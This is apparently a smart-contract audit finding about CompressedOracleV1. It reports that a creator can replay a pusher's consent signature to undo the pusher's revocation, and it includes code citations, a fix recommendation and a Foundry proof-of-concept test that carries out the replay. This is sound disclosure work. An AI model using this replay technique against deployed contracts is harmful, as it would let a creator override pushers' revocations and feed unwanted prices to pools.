### Title
Creator Can Replay Pusher Consent Signature to Silently Reinstate a Revoked Delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` contains no used-signature registry or post-revocation guard. A creator who holds a pusher's valid EIP-191 consent signature can call `allowPushers` again with the identical `(deadline, pusher, sig)` tuple after the pusher has self-revoked via `revokePusher()`, instantly reinstating `namespaceRemapping[pusher] = creator`. The pusher's revocation is silently overwritten and their subsequent fallback pushes continue to land in the creator's namespace rather than their own.

---

### Finding Description

`allowPushers` validates three things and then unconditionally writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);                          // (1) deadline not expired
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));  // (2) pusher signed consent
    namespaceRemapping[pusher] = msg.sender;                // (3) unconditional write
    emit PusherAuthorized(pusher, msg.sender);
}
``` [1](#0-0) 

There is no check for whether `namespaceRemapping[pusher]` was previously cleared by `revokePusher`. The signed consent message encodes only `(chainid, oracle, deadline, pusher, creator)` — it carries no nonce, no revocation counter, and no "single-use" flag. A signature that was valid before revocation remains cryptographically valid after revocation, as long as `block.timestamp <= deadline`.

`revokePusher` clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [2](#0-1) 

But the creator can immediately call `allowPushers` again with the same `(deadline, pusher, sig)` tuple, passing both checks and restoring `namespaceRemapping[pusher] = creator`. The code's own NatSpec acknowledges the risk but misidentifies the deadline as the complete fix:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [3](#0-2) 

The deadline prevents re-establishment only **after** it expires. During the entire deadline window the creator can replay the signature an unlimited number of times, making `revokePusher` a no-op.

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the pusher sends after the creator's replay lands in the creator's namespace, not the pusher's own, and overwrites the creator's live feed slots consumed by `price()` and downstream `AnchoredPriceProvider.getBidAndAskPrice()`. [5](#0-4) 

---

### Impact Explanation

The broken invariant is: **a pusher's `revokePusher()` call permanently ends their delegation until they sign a new consent**. Because the creator can replay the original signature, the pusher cannot exit the delegation during the deadline window. If the pusher is an automated off-chain system (the normal production case for a price-push oracle), it cannot stop sending transactions on demand. The creator keeps the delegation alive, the pusher's price updates continue to land in the creator's namespace, and any pool whose `AnchoredPriceProvider` reads from that namespace receives prices the pusher intended to stop supplying. A pusher that revokes because it detected a feed anomaly or a compromise cannot actually halt the feed — the creator can silently reinstate it and the pool continues to execute swaps against the compromised price stream.

---

### Likelihood Explanation

The creator already holds the pusher's signed consent (they used it to establish the delegation). No new off-chain action is required from the pusher. The creator needs only to call `allowPushers` again with the same arguments before the deadline. Deadlines are typically set days in the future (the test suite uses `block.timestamp + 1 days`). [6](#0-5) 

---

### Recommendation

Track consumed consent signatures with a `mapping(bytes32 => bool) private _usedConsents` keyed on `keccak256(abi.encode(chainid, oracle, deadline, pusher, creator))`. Mark the hash used on the first successful `allowPushers` call and revert on any subsequent call with the same hash. This makes each signed consent single-use: a pusher's revocation cannot be overturned without a fresh signature from the pusher.

Alternatively, add a per-pusher revocation nonce to the signed message so that any signature issued before the current nonce is rejected.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent (deadline = now + 1 day)
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher self-revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature — no new pusher action required
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // reinstated — revocation bypassed

// 5. Pusher's next fallback push lands in creator's namespace, not pusher's own
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw  = _packRaw(999_999, 5, 0);
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
assertTrue(ok);
// Creator's feed is updated — pool reads this price via AnchoredPriceProvider
assertEq(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
         U64x32.decode(uint32(raw >> 16)));
// Pusher's own namespace is empty — revocation had no lasting effect
assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L214-217)
```text
    function getBidAndAskPrice() external override returns (uint128 bid, uint128 ask) {
        (bid, ask) = _getBidAndAskPrice();
        if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
    }
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracle.t.sol (L340-342)
```text
        uint256 deadline = block.timestamp + 1 days;
        _allowPusher(deadline);
        assertEq(oracle.namespaceRemapping(pusher), creator, "pusher should map to creator");
```
